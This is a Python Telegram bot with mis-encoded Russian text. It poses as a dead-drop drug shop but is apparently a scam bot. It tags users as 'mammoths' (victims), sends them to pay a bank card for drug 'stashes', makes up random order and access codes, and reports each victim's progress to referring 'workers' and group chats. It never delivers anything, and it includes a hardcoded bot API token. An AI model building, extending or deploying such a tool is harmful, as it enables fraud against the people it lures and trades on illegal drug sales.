from random import randint

from aiogram import Dispatcher, Bot, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import logging

from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from sqlalchemy import func

from db_stuff_drug import Customers, Goods, BASE_DIR
from db_stuff import session, Cards, User
from main import bot as main_bot

API_TOKEN = '6854328045:AAGuDPv7xHklBGn7a-2kjzy1kwLQKp1hpx8'

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


@dp.message_handler(commands=['start'], state='*')
async def start(message: types.Message):
    username = message.from_user.username
    user_id = message.from_user.id
    tp = session.query(User.tg_id).filter(User.status == 2).first()
    try:
        referral_id = int(message.text.replace('/start ', ''))
        is_cust = session.query(Customers).filter(Customers.mammoth == username, Customers.worker_id == referral_id).count()
    except:
        is_cust = 1


    if is_cust == 0:
        referral_id = int(message.text.replace('/start ', ''))
        cust = Customers(tg_id_mammoth=user_id, mammoth=username, worker_id=referral_id)
        session.add(cust)
        session.commit()
        worker = session.query(User.username).filter(User.tg_id == referral_id).first()
        main_bot.send_message(
            text=f"–ü—Ä–∏—à–µ–ª –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç!\nusername: @{username}\n–í–æ—Ä–∫–µ—Ä: @{worker}",
            chat_id=referral_id)

        try:
            main_bot.send_message(
                text=f"–ü—Ä–∏—à–µ–ª –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç!\nusername: @{username}\n–í–æ—Ä–∫–µ—Ä: @{worker}",
                chat_id=tp)
        except:
            pass

        main_bot.send_message(
            text=f"–ü—Ä–∏—à–µ–ª –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç!\nusername: @{username}\n–í–æ—Ä–∫–µ—Ä: @{worker}",
            chat_id="-1002014887503")

        await bot.send_message(
            text=f"üåè –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –±–æ—Ç–∞, {username}! –í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–≤–µ—Å—Ç–∏ –≥–æ—Ä–æ–¥ –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ä–∞–±–æ—Ç—ã!üåç",
            chat_id=user_id)

    else:
        cust = session.query(Customers).filter(Customers.tg_id_mammoth == user_id).first()
        print(cust)
        worker = session.query(User.username).filter(User.tg_id == cust.worker_id).first()
        print(worker)
        await main_bot.send_message(
            text=f"–ú–∞–º–æ–Ω—Ç –ø–µ—Ä–µ–∑–∞—à–µ–ª –≤ –±–æ—Ç–∞!\nusername: @{username}\n–í–æ—Ä–∫–µ—Ä: @{worker[0]}",
            chat_id=cust.worker_id)
        await main_menu(user_id)


@dp.message_handler(lambda message: message.text)
async def get_city(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username
    cust = session.query(Customers).filter(Customers.tg_id_mammoth == user_id).order_by(Customers.id.desc()).first()
    worker = session.query(User.username).filter(User.tg_id == cust.worker_id).first()
    cust.city = message.text
    tp = session.query(User.tg_id).filter(User.status == 2).first()
    await main_bot.send_message(
        text=f"–ú–∞–º–æ–Ω—Ç –≤—ã–±—Ä–∞–ª –≥–æ—Ä–æ–¥: {cust.city}!\nusername: @{username}\n–í–æ—Ä–∫–µ—Ä: @{worker[0]}",
        chat_id=cust.worker_id)

    try:
        await main_bot.send_message(
            text=f"–ú–∞–º–æ–Ω—Ç –≤—ã–±—Ä–∞–ª –≥–æ—Ä–æ–¥: {cust.city}!\nusername: @{username}\n–í–æ—Ä–∫–µ—Ä: @{worker[0]}",
            chat_id=tp)
    except:
        pass

    session.add(cust)
    session.commit()
    await bot.send_message(
        text=f"üíä –ì–æ—Ä–æ–¥ —É—Å–ø–µ—à–Ω–æ –∑–∞–¥–∞–Ω! –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–∏—Ä —Ä–∞–¥–æ—Å—Ç–∏! üç¨",
        chat_id=user_id)
    await main_menu(user_id)


@dp.callback_query_handler(lambda c: c.data == 'central')
async def central(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == "central")
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='üè¨ –°–ª–∞–¥–æ—Å—Ç–∏ –≤ —Ü–µ–Ω—Ç—Ä–µ –≥–æ—Ä–æ–¥–∞ üè¨', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data == 'outskirts')
async def outskirts(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == "outskirts")
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='üõ£ –°—Ç–∞—Ñ—Ñ –Ω–∞ –æ–∫—Ä–∞–∏–Ω–µ –≥–æ—Ä–æ–¥–∞ üõ£', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data == '2km')
async def two_km(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == '2km')
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='üö≤ –°—Ç–∞—Ñ—Ñ –≤ 2¬± –∫–º –æ—Ç –≥–æ—Ä–æ–¥–∞ üö≤', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data == '5km')
async def five_km(message: types.Message):
    user_id = message.from_user.id
    goods = session.query(Goods).filter(Goods.typee == '5km')
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    for i in goods:
        keyboard_markup.add(InlineKeyboardButton(i.name, callback_data=f'item{i.id}'))
    await bot.send_message(text='üö≤ –°—Ç–∞—Ñ—Ñ –≤ 5¬± –∫–º –æ—Ç –≥–æ—Ä–æ–¥–∞ üö≤', chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data.startswith('item'))
async def item(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    item_id = int(callback_query.data[int(str(callback_query.data).find('item')) + 4:])
    item = session.query(Goods).filter(Goods.id == item_id).first()
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    if 'üß≤' in item.name:
        keyboard_markup.add(InlineKeyboardButton(f'–ö—É–ø–∏—Ç—å –º–∞–≥–Ω–∏—Ç üß≤ {item.price}', callback_data=f'buyitem{item.id}'))
    if 'üö™' in item.name:
        keyboard_markup.add(
            InlineKeyboardButton(f'–ö—É–ø–∏—Ç—å —Ç–∞–π–Ω–∏–∫ –≤ –ø–æ–¥—ä–µ–∑–¥–µ üö™ {item.price}', callback_data=f'buyitem{item.id}'))
    if 'ü™®' in item.name:
        keyboard_markup.add(
            InlineKeyboardButton(f'–ö—É–ø–∏—Ç—å –∫–∞–º–µ–Ω—å (–Ω–µ –≤ —Å–Ω–µ–≥—É) ü™® {item.price}', callback_data=f'buyitem{item.id}'))

    text = f'üõç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç–æ–≤–∞—Ä–µ: {item.name} üõç\n' \
           f'–°—Ç–æ–∏–º–æ—Å—Ç—å: {item.price} —Ä—É–±. (—Å —É—á–µ—Ç–æ–º –∫–æ–º–º–∏—Å–∏–∏ –Ω–∞—à–µ–≥–æ –æ–±–º–µ–Ω–Ω–∏–∫–∞)\n\n' \
           f'–ü–æ—Å–ª–µ –ø–æ–∫—É–ø–∫–∏ –≤—ã –ø–æ–ª—É—á–∞–µ—Ç–µ: —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ –∑–∞–∫–ª–∞–¥–∞, –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã, –æ–ø–∏—Å–∞–Ω–∏–µ –º–µ—Å—Ç–Ω–æ—Å—Ç–∏ –∏ –∞–¥—Ä–µ—Å.\n ' \
           f'–î–ª—è –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏—è –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –¥–ª—è –ø–æ–∫—É–ø–∫–∏ :)'

    await bot.send_message(text=text, chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data.startswith('buyitem'))
async def buyitem(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    item_id = int(callback_query.data[int(str(callback_query.data).find('buyitem')) + 7:])
    item = session.query(Goods).filter(Goods.id == item_id).first()
    card = session.query(Cards).filter(Cards.country == '—Ä—É—Å').order_by(Cards.id.desc()).first()
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    keyboard_markup.add(InlineKeyboardButton(f'–Ø –æ–ø–ª–∞—Ç–∏–ª ‚úÖ', callback_data=f'payid_{int(item.price)}'))
    tp = session.query(User).filter(User.status == 2).order_by(func.random()).first()
    cust = session.query(Customers).filter(Customers.tg_id_mammoth == int(user_id)).first()
    worker = session.query(User).filter(User.tg_id == cust.worker_id).first()

    await main_bot.send_message(
        text=f"–ú–∞–º–æ–Ω—Ç –Ω–∞ —ç—Ç–∞–ø–µ –æ–ø–ª–∞—Ç—ã!\nusername: @{cust.mammoth}\n–í–æ—Ä–∫–µ—Ä: @{worker.username}",
        chat_id=cust.worker_id)

    try:
        await main_bot.send_message(
            text=f"–ú–∞–º–æ–Ω—Ç –Ω–∞ —ç—Ç–∞–ø–µ –æ–ø–ª–∞—Ç—ã!\nusername: @{cust.mammoth}\n–í–æ—Ä–∫–µ—Ä: @{worker.username}",
            chat_id=tp.tg_id)
        tpp = tp.username
    except:
        tpp = None
        pass

    text = f"""üõç –ù–æ–º–µ—Ä –∑–∞–∫–∞–∑–∞: SPPM-{randint(10000, 99999)} üõç
    –ö–æ–¥ –¥–æ—Å—Ç—É–ø–∞: {randint(10000, 99999)}
    –ù–æ–º–µ—Ä –∑–∞—è–≤–∫–∏ –æ–±–º–µ–Ω–Ω–∏–∫–∞: {randint(100000, 500000)}
    
    –í–ù–ò–ú–ê–ù–ò–ï! –ü–µ—Ä–µ–≤–æ–¥–∏—Ç–µ –†–û–í–ù–û —É–∫–∞–∑–∞–Ω–Ω—É—é —Å—É–º–º—É! –ù–∏ –±–æ–ª—å—à–µ, –Ω–∏ –º–µ–Ω—å—à–µ!
    
    üí∏ –ü–µ—Ä–µ–≤–µ–¥–∏—Ç–µ (—Ä–æ–≤–Ω–æ —ç—Ç—É —Å—É–º–º—É): {item.price} —Ä—É–± üí∏
    üí≥ –ù–∞ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã: {card.numbers} üí≥
    
    üïê –ü–µ—Ä–µ–≤–æ–¥ –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –≤ —Ç–µ—á–µ–Ω–∏–∏ 20 –º–∏–Ω. üïê
    
    –ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ –ø–µ—Ä–µ–¥ –æ–ø–ª–∞—Ç–æ–π:
    
    1. –í—ã –¥–æ–ª–∂–Ω—ã –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ —Ä–æ–≤–Ω–æ —É–∫–∞–∑–∞–Ω–Ω—É—é —Å—É–º–º—É (–Ω–µ –±–æ–ª—å—à–µ –∏ –Ω–µ –º–µ–Ω—å—à–µ), –∏–Ω–∞—á–µ –≤–∞—à –ø–ª–∞—Ç–µ–∂ –∑–∞—á–∏—Å–ª–µ–Ω –Ω–µ –±—É–¥–µ—Ç!. –ü—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ –Ω–µ —Ç–æ—á–Ω–æ–π —Å—É–º–º—ã –≤—ã –º–æ–∂–µ—Ç–µ –æ–ø–ª–∞—Ç–∏—Ç—å —á—É–∂–æ–π –∑–∞–∫–∞–∑ –∏ –ø–æ—Ç–µ—Ä—è—Ç—å —Å—Ä–µ–¥—Å—Ç–≤–∞.
    
    2. –î–µ–ª–∞–π—Ç–µ –ø–µ—Ä–µ–≤–æ–¥ –æ–¥–Ω–∏–º –ø–ª–∞—Ç–µ–∂–æ–º, –µ—Å–ª–∏ –≤—ã —Ä–∞–∑–æ–±—å–µ—Ç–µ –ø–ª–∞—Ç–µ–∂ –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ, –≤–∞—à –ø–ª–∞—Ç–µ–∂ –∑–∞—á–∏—Å–ª–µ–Ω –Ω–µ –±—É–¥–µ—Ç!
    
    3. üïê –ü–µ—Ä–µ–≤–æ–¥ –Ω—É–∂–Ω–æ –æ—Å—É—â–µ—Å—Ç–≤–∏—Ç—å –≤ —Ç–µ—á–µ–Ω–∏–∏ 20 –º–∏–Ω. üïê –ü–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è –∑–∞–∫–∞–∑–∞. –ï—Å–ª–∏ –≤–∞–º –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –≤—Ä–µ–º–µ–Ω–∏, –æ—Ç–º–µ–Ω–∏—Ç–µ –∑–∞—è–≤–∫—É –∏ —Å–æ–∑–¥–∞–π—Ç–µ –Ω–æ–≤—É—é!
    
    4. –ï—Å–ª–∏ —É –≤–∞—Å –≤–æ–∑–Ω–∏–∫–ª–∏ –∫–∞–∫–∏–µ-–ª–∏–±–æ –ø—Ä–æ–±–ª–µ–º—ã —Å –æ–ø–ª–∞—Ç–æ–π, –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É (–∫–æ–Ω—Ç–∞–∫—Ç—ã: @{tpp}) –∏ –ø–µ—Ä–µ—à–ª–∏—Ç–µ —Ç—É–¥–∞ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.
    
    5. –ï—Å–ª–∏ –≤—ã –æ–ø–ª–∞—Ç–∏–ª–∏, –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É "–Ø –æ–ø–ª–∞—Ç–∏–ª ‚úÖ"
    """

    await bot.send_message(text=text, chat_id=user_id, reply_markup=keyboard_markup)


@dp.callback_query_handler(lambda c: c.data.startswith('payid_'))
async def payid(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    tp = session.query(User).filter(User.status == 2).order_by(func.random()).first()
    profit = int(callback_query.data[int(str(callback_query.data).find('payid_')) + 6:])
    cust = session.query(Customers).filter(Customers.tg_id_mammoth == int(user_id)).order_by(Customers.id.desc()).first()
    worker = session.query(User).filter(User.tg_id == cust.worker_id).first()
    await main_bot.send_message(
        text=f"–ú–∞–º–æ–Ω—Ç –æ–±—ä—è–≤–∏–ª –æ–± –æ–ø–ª–∞—Ç–µ {profit}—Ä!\nusername: @{cust.mammoth}\n–í–æ—Ä–∫–µ—Ä: @{worker.username}",
        chat_id=cust.worker_id)

    try:
        await main_bot.send_message(
            text=f"–ú–∞–º–æ–Ω—Ç –æ–±—ä—è–≤–∏–ª –æ–± –æ–ø–ª–∞—Ç–µ {profit}—Ä!\nusername: @{cust.mammoth}\n–í–æ—Ä–∫–µ—Ä: @{worker.username}",
            chat_id=tp)
    except:
        pass

    await main_bot.send_message(
        text=f"–ú–∞–º–æ–Ω—Ç –æ–±—ä—è–≤–∏–ª –æ–± –æ–ø–ª–∞—Ç–µ {profit}—Ä!\nusername: @{cust.mammoth}\n–í–æ—Ä–∫–µ—Ä: @{worker.username}",
        chat_id="-1002063632581")

    await main_bot.send_message(
        text=f"–ú–∞–º–æ–Ω—Ç –æ–±—ä—è–≤–∏–ª –æ–± –æ–ø–ª–∞—Ç–µ {profit}—Ä!\nusername: @{cust.mammoth}\n–í–æ—Ä–∫–µ—Ä: @{worker.username}",
        chat_id="-1002014887503")

    await bot.send_message(text='–û—Ç–ª–∏—á–Ω–æ! –ú—ã —Å–µ–π—á–∞—Å –ø—Ä–æ–≤–µ—Ä–∏–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é üîé –∏ –≤—ã–¥–∞–¥–∏–º –∞–¥—Ä–µ—Å –∫–∞–∫ –º–æ–∂–Ω–æ —Å–∫–æ—Ä–µ–µ. –ï—Å–ª–∏ –æ—Ç–≤–µ—Ç–∞'
                                ' –¥–æ–ª–≥–æ –Ω–µ—Ç, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —á–µ–∫ –≤ –Ω–∞—à—É –¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫—É üíñüë§', chat_id=user_id)


@dp.callback_query_handler(lambda c: c.data == 'history')
async def history(message: types.Message):
    user_id = message.from_user.id
    await bot.send_message(text='–í—ã –ø–æ–∫–∞ –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–∫—É–ø–∞–ª–∏!', chat_id=user_id)


@dp.callback_query_handler(lambda c: c.data == 'bonus')
async def bonus(message: types.Message):
    user_id = message.from_user.id
    await bot.send_message(text='–ú—ã –∞–∫—Ç–∏–≤–∏—Ä—É–µ–º –∫—É–ø–æ–Ω—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏ –∫–∞–∂–¥–æ–π 3 –ø–æ–∫—É–ø–∫–µ! üò±üíùü•¥ –ö—É–ø–æ–Ω—ã –æ—Ç 5% –¥–æ 15 %, '
                                '–∞ —Ç–∞–∫ –∂–µ –º—ã –∏—Ö –≤—ã–¥–∞–µ–º –∑–∞ –ø—Ä–∏–≥–ª–∞—â–µ–Ω–Ω—ã—Ö –¥—Ä—É–∑–µ–π! üëØ‚Äç‚ôÄÔ∏èüëØ‚Äç‚ôÄÔ∏è', chat_id=user_id)


async def main_menu(chat_id):
    tp = session.query(User).filter(User.status == 2).order_by(func.random()).first()
    keyboard_markup = InlineKeyboardMarkup(row_width=2)
    keyboard_markup.add(InlineKeyboardButton('üìç –¶–µ–Ω—Ç—Ä –≥–æ—Ä–æ–¥–∞ üìç', callback_data='central'))
    keyboard_markup.add(InlineKeyboardButton('üìç –û–∫—Ä–∞–∏–Ω–∞ –≥–æ—Ä–æ–¥–∞ üìç', callback_data='outskirts'))
    keyboard_markup.add(InlineKeyboardButton('üìç –î–æ 2¬± –∫–º –æ—Ç –≥–æ—Ä–æ–¥–∞ üìç', callback_data='2km'))
    keyboard_markup.add(InlineKeyboardButton('üìç –î–æ 5¬± –∫–º –æ—Ç –≥–æ—Ä–æ–¥–∞ üìç', callback_data='5km'))
    keyboard_markup.add(InlineKeyboardButton('–¢–µ—Ö. –ü–æ–¥–¥–µ—Ä–∂–∫–∞', url=f'https://t.me/{tp.username}'))
    keyboard_markup.add(InlineKeyboardButton('üõç –ò—Å—Ç–æ—Ä–∏—è –ø–æ–∫—É–ø–æ–∫ üõç', callback_data='history'))
    keyboard_markup.add(InlineKeyboardButton('üéÅ –ü—Ä–æ —Å–∫–∏–¥–∫–∏ üéÅ', callback_data='bonus'))
    keyboard_markup.add(InlineKeyboardButton('–¢—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å–≤–æ –ø–æ –∑–∞–ª–æ–≥—É', url=f'https://t.me/{tp.username}'))
    keyboard_markup.add(InlineKeyboardButton('–¢—Ä—É–¥–æ—É—Å—Ç—Ä–æ–π—Å–≤–æ –ø–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞–º', url=f'https://t.me/{tp.username}'))
    image_path = f'{BASE_DIR}\\images\\menu.jpg'
    print(image_path)
    with open(image_path, 'rb') as photo:
        await bot.send_photo(chat_id, photo, caption='–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é üíäüíâ', reply_markup=keyboard_markup)

if __name__ == '__main__':
    from aiogram import executor

    executor.start_polling(dp, skip_updates=True)